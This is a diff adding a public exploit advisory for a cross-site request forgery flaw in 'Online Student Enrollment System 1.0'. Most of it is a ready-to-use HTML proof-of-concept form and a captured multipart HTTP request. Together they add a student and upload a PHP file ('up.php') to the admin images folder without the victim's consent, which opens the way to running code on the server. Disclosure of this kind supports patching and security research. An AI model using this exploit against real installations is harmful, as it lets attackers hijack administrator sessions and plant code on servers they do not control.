@@ -1,0 +1,89 @@
+# Exploit Title: Online Student Enrollment System 1.0 - Cross-Site Request Forgery (Add Student)
+# Google Dork: N/A
+# Date: 2020-06-20
+# Exploit Author: BKpatron
+# Vendor Homepage: https://www.campcodes.com/projects/php/4745/online-student-enrollment-system-in-php-mysqli/
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/donbermoy/student_enrollment_1.zip
+# Version: v1.0
+# Tested on: Win 10
+# CVE: N/A
+# my website: bkpatron.com
+
+# Vulnerability:
+
+This product is unprotected against CSRF vulnerabilities.
+The application interface allows users to perform certain actions
+via HTTP requests without performing any validity checks to verify the
+requests.
+you can upload a PHP file here with CSRF.
+
+# CSRF PoC( add student ,File Upload):
+
+<html>
+<body>
+<form enctype="multipart/form-data" method="POST" action="http://localhost/student_enrollment/admin/index.php?page=add-student">
+		    <label for="name">Student Name</label>
+		    <input name="name" type="text" id="name" value="" required=""><br/>
+		    <label for="roll">Student Roll</label>
+		    <input name="roll" type="text" value="" pattern="[0-9]{6}" id="roll" required=""><br/>
+		    <label for="address">Student Address</label>
+		    <input name="address" type="text" value="" id="address" required=""><br/>
+		    <label for="pcontact">Parant Contact NO</label>
+		    <input name="pcontact" type="text" id="pcontact" pattern="01[5|6|7|8|9][0-9]{8}" value="" placeholder="01........." required=""><br/>
+		    <label for="class">Student Class</label>
+		    <select name="class" class="form-control" id="class" required=""><br/>
+		    	<option>Select</option>
+		    	<option value="1st">1st</option>
+		    	<option value="2nd">2nd</option>
+		    	<option value="3rd">3rd</option>
+		    	<option value="4th">4th</option>
+		    	<option value="5th">5th</option>
+		    </select><br/>
+		    <label for="photo">Student Photo</label>
+		    <input name="photo" type="file" id="photo" required=""><br/>
+		    <input name="addstudent" value="Add Student" type="submit" class="btn btn-danger">
+	 </form>
+  </body>
+</html>
+
+#HTTP Request:
+
+http://localhost/student_enrollment/admin/index.php?page=add-student
+
+POST /student_enrollment/admin/index.php?page=add-student HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------1586330740172
+Content-Length: 1669
+Referer: http://localhost/exploit2.php
+Cookie: _ga=GA1.1.1667382299.1577635358; PHPSESSID=2dhsgkdiavgfefp6g0qp63ruqe
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+-----------------------------1586330740172: undefined
+Content-Disposition: form-data; name="name"
+bkpatron
+-----------------------------1586330740172
+Content-Disposition: form-data; name="roll"
+
+333000
+-----------------------------1586330740172
+Content-Disposition: form-data; name="address"
+
+0000
+-----------------------------1586330740172
+Content-Disposition: form-data; name="pcontact"
+
+01911111111
+-----------------------------1586330740172
+Content-Disposition: form-data; name="class"
+
+1st
+-----------------------------1586330740172
+Content-Disposition: form-data; name="photo"; filename="up.php"
+Content-Type: application/octet-stream
+...
+
+// uploaded file path: http://localhost/student_enrollment/admin/images/your_file.php
